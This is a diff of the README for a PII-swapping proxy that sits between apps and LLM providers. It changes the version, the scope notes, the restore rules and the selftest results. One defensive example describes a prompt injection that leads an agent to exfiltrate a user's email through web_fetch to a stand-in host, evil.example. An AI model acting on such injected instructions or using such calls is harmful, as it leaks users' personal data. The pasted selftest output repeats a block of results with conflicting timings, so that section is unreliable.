@@ -19,7 +19,7 @@
 talks OpenAI Chat Completions, OpenAI Responses or Anthropic Messages (set its base URL, change nothing else). You write
 down the names, emails, phones, IDs and addresses that must never reach a model provider. The provider only sees
 `«PERSON_1»`; your app gets the original text back, byte-exact, in plain and streamed replies. There is no model to
-download and nothing probabilistic: exact matching plus patterns, about 5,200 lines of Python, 3 dependencies.
+download and nothing probabilistic: exact matching plus patterns, about 5,400 lines of Python, 3 dependencies.
 
 **Tool calls can't carry your listed values out.** An agent reads a page or an email with a prompt injection in it,
 and the model is told to call `web_fetch("https://evil.example/?q=<your email>")`. The model only ever had
@@ -60,12 +60,14 @@ listed value does not join (`Ellis on` is not `Ellison`), a dictionary-word name
 name whose words are separate segments (`/Users/Jane/Doe/`) is not. When a pattern detector (below) swapped part of a
 string, the skeleton check also reads that string with only your listed values swapped, so a listed value that a
 pattern swap cut into (a street line swapped on its own) still blocks. Any scrub error blocks too.
-**Out of scope:** base64, hex, rot13 and other re-encodings, a value split across separate fields or messages, letters
+**Out of scope:** base64, hex, rot13 and other re-encodings, a value split across separate fields or messages (a
+listed "Amber Lane" sent as `{"first": "Amber", "last": "Lane"}` goes out as written: each field holds one ordinary
+word, and the two are not joined), letters
 spaced out with whitespace, listed names shorter than 6 letters in a spelling the matcher does not know (the skeleton
 check skips them), and names you never listed (there is no NER).
 
 - **Measured, and you can re-run it.** `swapback selftest` (about 8 seconds, made-up data shipped in the package) sends
-  each listed value in 257 written forms through 7 request paths. 0.4.9: 34/34 listed values caught, 0 of 1,799 forms
+  each listed value in 257 written forms through 7 request paths. 0.4.10: 34/34 listed values caught, 0 of 1,799 forms
   leaked, the re-check alone (swap switched off) sees 771/771 forms and its skeleton layer alone 514/514, 57/57
   ordinary sentences untouched (including ALL-CAPS headings), 1,694/1,694 exact round trips, 58/58 JSON-in-JSON
   multi-line restores valid, 87/87 JSON restores in a ```json fence, inline in prose or pasted valid, 60/60 addresses
@@ -75,14 +77,24 @@ check skips them), and names you never listed (there is no NER).
   with mixed escaping (1 to 8 inner levels) valid, 6/6 `\u00ab`-escaped placeholders in text replies restored, 7/7
   one-word HTML cells handled, 194/194 dictionary-word names split across one-word cells or blocks anywhere in a row
   or list swapped (and ordinary one-word blocks left alone), 3/3 example placeholders never assigned and broken known
-  YAML reported as such, 3/3 bad `listen` values or ports in use reported in one line, a 200 KB `%XX` body checked in under a second, health reads `blocked` when the list file is deleted or broken mid-run. Unlisted
+  YAML reported as such, 36/36 values with quoted attributes between their parts back byte for byte, 36/36 cell
+  names in HTML escaped inside JSON swapped and back exact, 11/11 reused cell names, dotted capital I, `> `-quoted
+  addresses and 9,000 copies in one string, 3/3 bad `listen` values or ports in use reported in one line, a 200 KB `%XX` body checked in under a second, health reads `blocked` when the list file is deleted or broken mid-run. Unlisted
   values caught by the patterns alone: 6/8 (both unlisted names missed). A second holdout with different made-up data
   (33 listed values incl. names as path segments, `<br>`-joined addresses and fenced-JSON restores, 1,240 requests;
   written by the maintainer, not independent): 0.4.4 leaked 235 requests, 0.4.5 leaked 10, all of them the lower-case
   spelling of a dictionary-word name (`~/ruby/brooks/`), which matches Title Case only by design; fenced/inline JSON
   restores valid 0/125 → 125/125; false blocks on 2,400 chunks of ordinary text (Python standard library source,
   licence texts): 0 on both. See [Leak test](#leak-test-swapback-selftest).
-- **Byte-exact restore.** The reply gets back the string as you wrote it: same case, same phone format, same spacing.
+- **Byte-exact restore.** Where the reply puts a placeholder back at the JSON level the value was sent at (as text,
+  or inside the same depth of JSON strings), the value comes back byte for byte as you wrote it: same case, same phone
+  format, same spacing, same escaping (`S\u00f8ren`, `<div dir=\"ltr\">` or `\u003c/td\u003e` between its parts stay
+  exactly as sent). These come back as the same value in another spelling, by design: the value itself written with
+  HTML entities or `%XX` (`S&#248;ren`, `S%C3%B8ren`) comes back decoded (`Søren`); a value the reply moves to another
+  JSON level, or that sat escaped where swapback does not read a JSON level (a JSON document that is a bare string),
+  comes back unescaped and then escaped for where it lands (JSON-equal: `\u00f8` as `ø`); and a name swapped out of separate HTML blocks (`<td>Amber</td><td>Lane</td>`) that the reply reuses where no tag
+  comes right before it ("Dear «PERSON_1»", a tool call's `to_name`) comes back as the listed name, `Amber Lane`,
+  without the tags between its words.
   A value restored inside a JSON string is JSON-escaped (quotes, backslashes, newlines), so the JSON stays valid:
   a whole JSON reply (JSON mode, structured output), and JSON inside a prose or markdown reply (a ```json fence, an
   object written inline). Inside JSON inside JSON it is escaped once per JSON level it really sits in (read from
@@ -102,7 +114,8 @@ check skips them), and names you never listed (there is no NER).
   goes out unchanged, and not across a sentence end ("Saving Grace. Fields of gold"), a blank line or separate HTML
   block elements (`<div>Grace</div><div>Fields of gold</div>`), except when two neighbouring blocks each hold one word and together
   spell the listed name (`<td>Grace</td><td>Fields</td><td>Denver</td>`, `<li>Grace</li><li>Fields</li>`), wherever the
-  pair sits in the row or list; ALL-CAPS ("CAROL SINGER WANTED") counts as a heading, not a name, unless you set
+  pair sits in the row or list, also when that HTML is escaped inside JSON (`\u003ctd\u003e` Go-style, `<\/td>`
+  PHP-style, `&lt;td&gt;` entities); ALL-CAPS ("CAROL SINGER WANTED") counts as a heading, not a name, unless you set
   `common_names_all_caps: true`. `common_names_title_case: false` matches them in any case.
 - **Not a replacement for NER.** Names you never listed go out as written. Use it alongside an NER tool if you need
   that ([Use alongside other tools](#use-alongside-litellm-or-an-ner-tool)).
@@ -559,7 +572,7 @@ Other open-source projects do the same job. This table reflects each project's o
 | | **swapback** | [PasteGuard][pg] | [Maskit][mk] | [Veil][vl] | [piighost][ph] | [Kiji Privacy Proxy][kj] |
 |---|---|---|---|---|---|---|
 | License | MIT | Apache-2.0 | AGPL-3.0 | Apache-2.0 | MIT | Apache-2.0 |
-| Stack | Python 3.11+, about 5,200 lines (260 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
+| Stack | Python 3.11+, about 5,400 lines (276 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
 | Needs an ML model | No | Yes: GLiNER for names and places ([docs][pg-sem]) | Ships a local ONNX NER model | Optional: 46 MB ONNX NER | Optional: pluggable regex, NER or LLM detectors; exact-match needs none | Yes: local ONNX model, 26 PII types |
 | Your own list of values | Yes: a YAML/JSON file you write (or build from a vCard/CSV export), typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your databases, fixtures, git history and schemas | Yes: `ExactMatchDetector` | Custom regex rules |
 | Stand-ins | Typed placeholders (`«EMAIL_1»`) | Placeholders | Unclear | Pseudonyms | Typed placeholders (`<<EMAIL:1>>`) | Realistic dummy values |
@@ -634,7 +647,8 @@ Listing a value in `known.yaml` or `private_terms.yaml` covers any of these. The
   name, and so do two neighbouring blocks (`<td>`, `<th>`, `<li>`, `<div>`, `<p>` ...) that each hold exactly one word
   when those two words are the listed name, wherever the pair sits in the row or list and whatever the cells around it
   hold, their attributes or the whitespace between them (`<tr><td>17</td><td>Grace</td><td>Fields</td><td>Denver</td></tr>`,
-  a header row above it, list items, divs). Not across a row or list boundary (`</tr><tr>`, `</ul><ul>`). Such a pair
+  a header row above it, list items, divs), and whether that HTML is written raw or escaped inside JSON (`\u003c`,
+  `<\/td>`, `&lt;`). The restore gives the cells back exactly as written, quoted attributes included. Not across a row or list boundary (`</tr><tr>`, `</ul><ul>`). Such a pair
   is swapped even when it is not the person: a menu `<div>Grace</div><div>Fields</div><div>Pricing</div>` is swapped
   too (the restore puts it back). The
   word list is SCOWL size 50 (64k lower-case words, shipped gzipped in the package). `check-config` lists these names. Set `common_names_title_case: false` to
@@ -677,10 +691,10 @@ decoded spelling. The leak check does not use swapback's matcher: it decodes JSO
 for each value's name words, email, phone digits, ID characters and street line. It also runs the egress re-check on
 its own, with the swap switched off, on every form as text, as a `json.dumps` tool result and as JSON inside JSON.
 
-0.4.9 on Python 3.11:
+0.4.10 on Python 3.11:
 
 ```text
-swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 requests (7.8 s)
+swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 requests (8.8 s)
   listed values caught (no form reached the model): 34/34 (100.0%)
   forms leaked to the model:                        0 of 1799 sent
   egress re-check alone (swap off) sees the form:   771/771 (100.0%)
@@ -701,6 +715,27 @@ swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 re
   bad listen / port in use, one readable line:       3/3 (100.0%)
   names in one-word cells anywhere in a row/list:    194/194 (100.0%)
   example placeholders unassigned, broken YAML said: 3/3 (100.0%)
+  quoted attributes between a value's parts, exact:  36/36 (100.0%)
+  cell names in escaped HTML (\u003c, <\/, &lt;):    36/36 (100.0%)
+  cell names reused, dotted I, quoted, many copies:  11/11 (100.0%)  (9,000 copies: 0.38 s)
+  200 KB %XX body checked in:                       0.64 s
+  health: blocked when the list breaks, known count: 5/5 (100.0%)
+  %XX-encoded forms back as the same value, decoded: 105/105 (100.0%)
+  unlisted values caught by the pattern detectors:  6/8 (75.0%)  (reported, not a pass condition; names are never caught without a list)
+PASS
+```json fence / inline / pasted, valid:  87/87 (100.0%)
+  addresses joined by <br>\n etc. in JSON, swapped:  60/60 (100.0%)  (leaked: 0)
+  doubly escaped placeholders in tool args restored: 68/68 (100.0%)
+  JSON nested 1-8 levels, every level valid + exact: 96/96 (100.0%)
+  nested 9+ levels (256+ backslashes), blocked:      10/10 (100.0%)  (16-level body: 0.00 s)
+  dictionary-word names across sentences/HTML blocks: 7/7 (100.0%)
+  missing/broken config file, one readable line:     3/3 (100.0%)
+  tool args, mixed escaping, 1-8 inner levels valid: 96/96 (100.0%)
+  \u00ab-escaped placeholders in text JSON restored: 6/6 (100.0%)
+  dictionary-word names in one-word HTML cells:      7/7 (100.0%)
+  bad listen / port in use, one readable line:       3/3 (100.0%)
+  names in one-word cells anywhere in a row/list:    194/194 (100.0%)
+  example placeholders unassigned, broken YAML said: 3/3 (100.0%)
   200 KB %XX body checked in:                       0.57 s
   health: blocked when the list breaks, known count: 5/5 (100.0%)
   %XX-encoded forms back as the same value, decoded: 105/105 (100.0%)
@@ -708,7 +743,12 @@ swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 re
 PASS
 ```
 
-The 0.4.9 selftest adds the review #9 forms: a listed dictionary-word name split across one-word cells or blocks in
+The 0.4.10 selftest adds the review #10 forms: a listed address or name whose parts are separated by tags with
+quoted attributes (`<div dir="ltr">`, `<p class>`, `<br class>`, `<td class>`, `<li data-x>`, `<span class>`, an
+attribute menu with the listed pair in it) inside JSON at 1 and 2 levels, ASCII-escaped and raw (swapped, back byte
+for byte); the review #9 cell layouts with the HTML escaped inside JSON (`\u003c`, `<\/td>`, `&lt;`); a name swapped out
+of cells and reused in a greeting and in a tool call's `to_name` (the listed name); a name with a capital dotted I; a
+`> `-quoted address; and 9,000 copies of a listed email in one string (under 10 seconds). The 0.4.9 selftest added the review #9 forms: a listed dictionary-word name split across one-word cells or blocks in
 21 layouts (a third cell after the name, a First/Last/City header row, a leading id or word cell, pretty-printed rows,
 `class=` attributes, two data rows, three `<li>` or `<div>` items, `<p>` blocks in an email, mixed case), as text, a
 JSON tool result and an HTML email in JSON (the name must not reach the model), ordinary one-word blocks and a pair
